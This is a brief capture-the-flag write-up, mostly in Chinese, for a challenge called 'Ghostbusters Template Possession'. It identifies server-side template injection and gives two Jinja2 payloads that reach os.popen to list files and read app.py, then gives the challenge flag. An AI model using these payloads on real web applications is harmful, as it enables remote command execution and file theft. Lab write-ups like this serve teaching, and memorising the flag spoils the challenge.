# Ghostbusters Template Possession

## 題目描述

Spengler's Oscillation Translator is warping the containment HUD in impossible ways. The console still seems eager to reveal what the filters were meant to hide.

## 解題思路

這題就 SSTI，那時候太閒了順便把整個題目的檔案都 dump 出來了，想看的可以去 /chal 裡面看

```py
{{ cycler.__init__.__globals__.os.popen('ls -la').read() }}
{{ cycler.__init__.__globals__.os.popen('cat app.py').read() }}
```

## Flag

```text
bitctf{{gh057ly_j1nj4_p0ss35510n}}
```
